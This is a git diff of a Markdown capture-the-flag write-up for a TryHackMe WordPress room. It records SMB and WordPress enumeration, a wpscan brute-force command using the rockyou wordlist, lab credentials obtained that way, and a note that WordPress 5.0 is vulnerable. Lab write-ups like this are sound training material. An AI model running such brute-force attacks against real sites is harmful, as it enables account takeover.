@@ -6,74 +6,75 @@ description: TryHackMe Mr. Robot CTF Write-Up
 tags: tryhackme wordpress 
 comments: false
 ---
-# BILLY JOEL
--TRYHACKME CTF WRITEUP-
 [Link To CTF](https://tryhackme.com/room/mrrobot)
-
-
-
-BILLY JOEL
-
-
-
-
-nmap shows: 
+-TRYHACKME CTF WRITEUP-
+<br>
+<br>
+<br>
+## nmap shows: 
 22/tcp  open  ssh
 80/tcp  open  http
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
 
-smbmap shows:
+## Let's do an SMB scan
+
+## smbmap shows:
         print$                                                  NO ACCESS       Printer Drivers
         BillySMB                                                READ, WRITE     Billy's local SMB Share
         IPC$                                                    NO ACCESS       IPC Service (blog server (Samba, Ubuntu))
-[*] Closed 1 connections    
+   
 
+<br>
+{% highlight bash %}
+***SMB rabbit Hole***
+Navingating into the SMB share,
+I found 2 images and 1 mp4 audio file
+I download all 3
 
-****SMB rabbit Hole
-We can see 2 images and 1 mp4 audio file
-Lets download all 3
-
-Alice-white-rabbit turned out to be a rabbit hole
+This turned out to be a rabbit hole
+Alice-white-rabbit literally says "rabbit hole"
 tswift is literally a taylor swift music video
 check-this opens a urlcode to a billy joel music vido 
-
 ***Looks like SMB was a dead end
+{% endhighlight bash %}
+<br>
 
-****Going to /wp-content shows another dead end
-*** http://10.201.58.182/wp-admin/admin-ajax.php also dead end
-
-
-As this machine details that a wordpress blog is being used lets check it out
+## As this machine details that a wordpress blog is being used lets check it out:
+{% highlight bash %}
 wpscan --update
 wpscan -H 
 wpscan -e vp,vt,u
+{% endhighlight bash %}
+
+## Full scan shows usernames 
+bjoel
+kwheel
+
+## we can brute force passwords for these usernames 
+wpscan --url http://10.201.58.182 --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
 
 
-Looking at robots.txt 
+## We get karen Wheelers username and password
+Username: kwheel, Password: cutiepie1
+
+## Looking at robots.txt: 
 User-agent: *
 Disallow: /wp-admin/
 Allow: /wp-admin/admin-ajax.php
 
-*** http://10.201.58.182/wp-admin/admin-ajax.php also dead end
+{% highlight bash %}
+*** /wp-admin/admin-ajax.php is a dead end
+*** /wp-content shows another dead end
+{% endhighlight bash %}
 
-login page at:
+## login page at:
 /wp-admin/
 
-Full scan shows usernames 
-bjoel
-kwheel
 
-we can brute force passwords for these usernames 
-wpscan --url http://10.201.58.182 --usernames bjoel,kwheel --passwords /usr/share/wordlists/rockyou.txt 
+## We can login at /wp-admin
 
-
-We get karen Wheelers username and password
-Username: kwheel, Password: cutiepie1
-
-We can login at /wp-admin
-
-Attempting to upload payloads shows filters preventing the php script
+## Attempting to upload payloads shows filters preventing the php script
 
 
 This is WordPress 5.0, which is vulnerable! 
